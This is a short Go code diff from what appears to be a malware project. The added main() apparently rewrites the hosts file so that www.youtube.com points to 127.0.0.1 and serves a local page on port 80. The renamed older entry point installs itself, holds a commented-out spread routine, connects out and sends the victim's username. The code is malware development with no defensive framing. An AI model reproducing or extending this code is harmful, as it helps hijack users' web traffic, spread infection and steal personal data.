@@ -23,9 +23,16 @@ import (
 var key_text []byte
 
 func main() {
+	network.AddHost("127.0.0.1", "www.youtube.com")
+	network.ServePage("ok4", 80)
+	fmt.Println("here")
+}
+
+func main_testing() {
 	//Check if already running
 	instances.CheckMultiInstances()
 	install.Install()
+
 	//go Spread()
 	network.Connect()
 	network.Send("user", utils.GetUsername())
